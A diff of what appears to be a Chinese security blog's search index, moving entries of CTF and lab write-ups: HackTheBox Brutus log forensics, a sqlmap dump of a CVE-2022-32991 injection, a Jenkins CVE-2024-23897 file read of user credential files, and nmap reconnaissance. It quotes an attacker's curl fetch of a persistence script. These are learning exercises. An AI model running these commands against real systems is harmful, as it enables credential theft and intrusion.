@@ -304,59 +304,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Brutus</title>
-    <url>/article/Brutus-HackTheBox.html</url>
-    <content><![CDATA[<p>wtmp日志文件</p>
-<span id="more"></span>
-
-<h1 id="Brutus"><a href="#Brutus" class="headerlink" title="Brutus"></a>Brutus</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
-<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
-</blockquote>
-<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
-<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
-<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
-<p>我们在对成功登录的日志记录下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
-
-<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
-<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
-<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
-<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
-<blockquote>
-<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
-</blockquote>
-<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
-<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
-<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
-<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
-<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
-<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
-<p>善于使用搜索引擎</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
-<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
-
-<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
-<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>日志分析</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BoardLight</title>
     <url>/article/BoardLight-HackTheBox.html</url>
     <content><![CDATA[<p>Dolibarr 代码执行漏洞、Enlightenment组件权限提升漏洞</p>
@@ -424,6 +371,59 @@
         <category>渗透</category>
       </categories>
       <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Brutus</title>
+    <url>/article/Brutus-HackTheBox.html</url>
+    <content><![CDATA[<p>wtmp日志文件</p>
+<span id="more"></span>
+
+<h1 id="Brutus"><a href="#Brutus" class="headerlink" title="Brutus"></a>Brutus</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
+<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
+</blockquote>
+<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
+<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
+<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
+<p>我们在对成功登录的日志记录下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
+
+<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
+<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
+<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
+<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
+<blockquote>
+<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
+</blockquote>
+<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
+<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
+<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
+<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
+<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
+<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
+<p>善于使用搜索引擎</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
+<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
+
+<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
+<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>日志分析</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
         <tag>HackTheBox</tag>
       </tags>
   </entry>
@@ -624,6 +624,27 @@
       </categories>
   </entry>
   <entry>
+    <title>CVE-2022-32991</title>
+    <url>/article/CVE-2022-32991.html</url>
+    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
+<span id="more"></span>
+
+<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
+<p>对各个页面的参数就行sqlmap扫描</p>
+<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
+]]></content>
+      <categories>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CVE-2022-30887</title>
     <url>/article/CVE-2022-30887.html</url>
     <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
@@ -642,27 +663,6 @@
 <p><img src="/article/CVE-2022-30887/image-20240725091109347.png" alt="image-20240725091109347"></p>
 <p>访问直接命令执行，得到flag</p>
 <p><img src="/article/CVE-2022-30887/image-20240725091251513.png" alt="image-20240725091251513"></p>
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CVE-2022-32991</title>
-    <url>/article/CVE-2022-32991.html</url>
-    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
-<span id="more"></span>
-
-<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
-<p>对各个页面的参数就行sqlmap扫描</p>
-<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
 ]]></content>
       <categories>
         <category>春秋云镜</category>
@@ -1308,6 +1308,75 @@
       </tags>
   </entry>
   <entry>
+    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
+    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
+    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
+<span id="more"></span>
+
+<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
+<p>cd进入目录下，依次执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
+
+<p>访问8080端口即可</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
+<blockquote>
+<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
+</blockquote>
+<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
+<p>Jenkins有几种鉴权方案：</p>
+<ul>
+<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
+<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
+<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
+<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
+</ul>
+<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
+<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
+<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
+<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
+<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
+<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
+<p>总结一下就是：</p>
+<ul>
+<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
+<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
+</ul>
+<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
+<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
+<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
+<p>比如使用help命令能读取前两行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
+<p>使用keep-build命令，可以读取文件第3行</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
+<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
+<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
+<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
+<ul>
+<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
+<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
+<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
+<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
+</ul>
+<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到用户名<code>admin_6382705393240952219</code></p>
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
+<p>接着读取到用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ISCC2024-数据泄露</title>
     <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
     <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
@@ -1414,73 +1483,112 @@
       </tags>
   </entry>
   <entry>
-    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
-    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
-    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
+    <title>Monitored</title>
+    <url>/article/Monitored-HackTheBox.html</url>
+    <content><![CDATA[<p>snmp协议</p>
 <span id="more"></span>
 
-<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
-<p>cd进入目录下，依次执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
+<h1 id="Monitored"><a href="#Monitored" class="headerlink" title="Monitored"></a>Monitored</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.248</span><br></pre></td></tr></table></figure>
 
-<p>访问8080端口即可</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">84/tcp   filtered ctf</span><br><span class="line">389/tcp  open     ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open     ssl/http Apache httpd 2.4.56 ((Debian))</span><br></pre></td></tr></table></figure>
+
+<p>注意到80端口跳转到<code>https://nagios.monitored.htb/</code>且无法访问，我们试试添加到<code>/etc/hosts</code>成功访问</p>
+<p>继续访问发现是登陆界面</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403182522547.png"></p>
+<p>然后就没有什么收获了，参考国外师傅wp是要进行 udp 扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sC -v -sU 10.10.11.248</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE         SERVICE  VERSION</span><br><span class="line">68/udp  open|filtered dhcpc</span><br><span class="line">123/udp open          ntp      NTP v4 (unsynchronized)</span><br><span class="line">161/udp open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp open|filtered snmptrap</span><br></pre></td></tr></table></figure>
+
+<p>注意到161端口为snmp协议，我们先简单了解下两个概念</p>
+<p><strong>SNMP</strong></p>
 <blockquote>
-<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
+<p>SNMP是一种标准的网络管理协议，它允许管理员监控和管理网络设备，例如路由器、交换机、服务器等。它有三个版本分别是<code>1，c2，3</code>，主要区别在于操作类型和安全性。</p>
 </blockquote>
-<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
-<p>Jenkins有几种鉴权方案：</p>
-<ul>
-<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
-<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
-<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
-<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
-</ul>
-<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
-<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
-<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
-<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
-<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
